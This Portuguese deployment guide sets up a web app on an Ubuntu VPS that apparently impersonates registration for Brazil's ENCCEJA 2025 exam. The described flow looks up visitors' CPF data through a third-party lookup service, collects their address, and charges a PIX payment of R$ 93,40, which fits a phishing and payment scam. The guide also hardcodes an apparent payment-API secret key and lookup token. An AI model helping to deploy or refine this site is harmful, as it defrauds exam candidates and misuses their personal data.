# ENCCEJA 2025 - Guia Definitivo VPS Ubuntu Hostinger

## 🎯 PROBLEMA RESOLVIDO

Erro do supervisor "spawn error" corrigido. Criada aplicação otimizada para VPS Ubuntu.

## 📦 ARQUIVOS CRIADOS

1. **`VPS_UBUNTU_DEPLOY_COMPLETO.py`** - Aplicação final otimizada
2. **`VPS_UBUNTU_SUPERVISOR_CONFIG.conf`** - Configuração correta do supervisor  
3. **`VPS_UBUNTU_DEPLOY_COMANDOS.sh`** - Script automatizado de deploy
4. **`VPS_UBUNTU_GUIA_DEPLOY_FINAL.md`** - Este guia

## 🚀 DEPLOY AUTOMATIZADO - OPÇÃO 1

### Via MobaXterm:
1. **Upload dos arquivos:**
   - `VPS_UBUNTU_DEPLOY_COMPLETO.py` → `/var/www/encceja/`
   - `VPS_UBUNTU_DEPLOY_COMANDOS.sh` → `/var/www/encceja/`

2. **Execute no terminal SSH:**
```bash
cd /var/www/encceja
chmod +x VPS_UBUNTU_DEPLOY_COMANDOS.sh
./VPS_UBUNTU_DEPLOY_COMANDOS.sh
```

3. **Aguarde** o script executar todas as configurações automaticamente.

---

## 🛠️ DEPLOY MANUAL - OPÇÃO 2

Se preferir fazer passo a passo:

### PASSO 1: Upload e Preparação
```bash
# Conectar na VPS
ssh root@seu-servidor-hostinger.com

# Ir para diretório
cd /var/www/encceja

# Parar aplicação atual
supervisorctl stop encceja

# Backup da aplicação atual
mv app.py app.py.backup_$(date +%Y%m%d_%H%M%S)

# Upload VPS_UBUNTU_DEPLOY_COMPLETO.py via MobaXterm
# Renomear arquivo
mv VPS_UBUNTU_DEPLOY_COMPLETO.py app.py
```

### PASSO 2: Configurar Ambiente Python
```bash
# Criar/ativar ambiente virtual
python3 -m venv venv
source venv/bin/activate

# Instalar dependências
pip install --upgrade pip
pip install flask==2.3.3 requests==2.31.0 gunicorn==21.2.0
pip install qrcode[pil] || echo "QRCode opcional"

# Verificar instalação
python3 -c "import flask, requests; print('✅ Dependências OK')"
```

### PASSO 3: Configurar Environment
```bash
# Criar arquivo .env
cat > /var/www/encceja/.env << 'EOF'
SESSION_SECRET=encceja-vps-ubuntu-2025-hostinger-secure
WITEPAY_API_KEY=sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d
FLASK_ENV=production
EOF

# Definir permissões
chown -R www-data:www-data /var/www/encceja
chmod -R 755 /var/www/encceja
chmod 600 /var/www/encceja/.env
```

### PASSO 4: Configurar Supervisor (CORRIGIDO)
```bash
# Configuração correta do supervisor
cat > /etc/supervisor/conf.d/encceja.conf << 'EOF'
[program:encceja]
command=/var/www/encceja/venv/bin/python3 /var/www/encceja/app.py
directory=/var/www/encceja
user=www-data
autostart=true
autorestart=true
startsecs=10
startretries=5
stderr_logfile=/var/log/supervisor/encceja_error.log
stdout_logfile=/var/log/supervisor/encceja_output.log
environment=PATH="/var/www/encceja/venv/bin:/usr/local/bin:/usr/bin:/bin",PYTHONPATH="/var/www/encceja",PYTHONUNBUFFERED="1"
redirect_stderr=false
stdout_logfile_maxbytes=50MB
stdout_logfile_backups=10
stderr_logfile_maxbytes=50MB
stderr_logfile_backups=10
killasgroup=true
stopasgroup=true
stopsignal=TERM
stopwaitsecs=10
EOF

# Criar diretórios de log
mkdir -p /var/log/supervisor
touch /var/log/supervisor/encceja_error.log
touch /var/log/supervisor/encceja_output.log
chown www-data:www-data /var/log/supervisor/encceja_*.log
```

### PASSO 5: Testar Aplicação
```bash
# Teste manual da aplicação
cd /var/www/encceja
source venv/bin/activate

# Verificar se carrega sem erros
python3 -c "
import app
print('✅ Aplicação OK')

with app.app.test_client() as client:
    response = client.get('/status')
    print(f'Status: {response.status_code}')
    if response.status_code == 200:
        print('✅ API funcionando')
    else:
        print('❌ Erro na API')
"
```

### PASSO 6: Iniciar Aplicação
```bash
# Atualizar supervisor
supervisorctl reread
supervisorctl update
supervisorctl start encceja

# Verificar status
supervisorctl status encceja
# Deve mostrar: encceja RUNNING
```

---

## 🔍 VERIFICAÇÃO FINAL

### 1. Status do Supervisor
```bash
supervisorctl status encceja
# Resultado esperado: encceja RUNNING pid 12345, uptime 0:00:10
```

### 2. Verificar Porta 5000
```bash
netstat -tlnp | grep :5000
# Deve mostrar processo Python na porta 5000
```

### 3. Teste Local
```bash
curl http://localhost:5000/status
# Deve retornar JSON com status: "online"
```

### 4. Ver Logs em Tempo Real
```bash
tail -f /var/log/supervisor/encceja_output.log
# Deve mostrar logs [VPS-UBUNTU] sem erros
```

### 5. Teste no Navegador
1. Acesse: `http://seu-dominio-vps`
2. Deve carregar página ENCCEJA 2025
3. Teste formulário CPF: `12345678901`
4. Deve mostrar dados e botão "Continuar Inscrição"

---

## 🔧 SOLUÇÃO DE PROBLEMAS

### Se Supervisor mostrar "FATAL":
```bash
# Ver erro detalhado
tail -50 /var/log/supervisor/encceja_error.log

# Verificar se Python está correto
ls -la /var/www/encceja/venv/bin/python3

# Testar aplicação manualmente
cd /var/www/encceja
source venv/bin/activate
python3 app.py
# Se der erro aqui, corrigir o problema mostrado
```

### Se der erro de dependências:
```bash
cd /var/www/encceja
source venv/bin/activate
pip install --upgrade flask requests
supervisorctl restart encceja
```

### Se API CPF não funcionar:
```bash
# Testar API diretamente
curl "https://consulta.fontesderenda.blog/cpf.php?cpf=12345678901&token=1285fe4s-e931-4071-a848-3fac8273c55a"
# Deve retornar dados JSON
```

---

## ✅ DIFERENÇAS DA VERSÃO CORRIGIDA

### 1. **Configuração Supervisor Otimizada:**
- `startretries=5` (mais tentativas)
- `PYTHONUNBUFFERED="1"` (logs em tempo real)
- `killasgroup=true` (mata processos filhos)
- Logs detalhados com rotação

### 2. **Aplicação Otimizada para Produção:**
- Logging detalhado com prefixos `[VPS-UBUNTU]`
- Templates inline (não depende de arquivos externos)
- Error handling robusto
- Timeout adequado para APIs
- Debug desabilitado para produção

### 3. **APIs Funcionais:**
- CPF API: `https://consulta.fontesderenda.blog/cpf.php`
- WitePay com fallback PIX garantido
- QR Code com fallback se biblioteca não disponível

### 4. **Fluxo Completo:**
- `/inscricao` → consulta CPF → mostra dados → botão continuar
- `/encceja-info` → informações do exame
- `/validar-dados` → confirmar dados
- `/endereco` → informar endereço
- `/local-prova` → escolher local
- `/pagamento` → gerar PIX R$ 93,40
- `/inscricao-sucesso` → finalização

---

## 🎉 RESULTADO FINAL

Após seguir este guia:

✅ **Sistema estável** na VPS Ubuntu Hostinger  
✅ **Supervisor funcionando** sem spawn errors  
✅ **APIs reais funcionando** (CPF + WitePay)  
✅ **Fluxo completo** idêntico à Replit  
✅ **PIX R$ 93,40** gerado corretamente  
✅ **Logs detalhados** para monitoramento  
✅ **Templates inline** (funciona sem arquivos externos)  
✅ **Produção-ready** com error handling robusto  

## 📞 SUPORTE FINAL

Se ainda houver problemas, execute o diagnóstico completo:

```bash
echo "=== DIAGNÓSTICO ENCCEJA VPS UBUNTU ==="
echo "Supervisor Status:"
supervisorctl status encceja

echo "Logs Recentes:"
tail -20 /var/log/supervisor/encceja_output.log
tail -20 /var/log/supervisor/encceja_error.log

echo "Porta 5000:"
lsof -i :5000

echo "Teste API:"
curl -I http://localhost:5000/status

echo "Aplicação:"
ls -la /var/www/encceja/app.py
head -5 /var/www/encceja/app.py
```

A aplicação está otimizada para rodar de forma estável e confiável na VPS Ubuntu da Hostinger.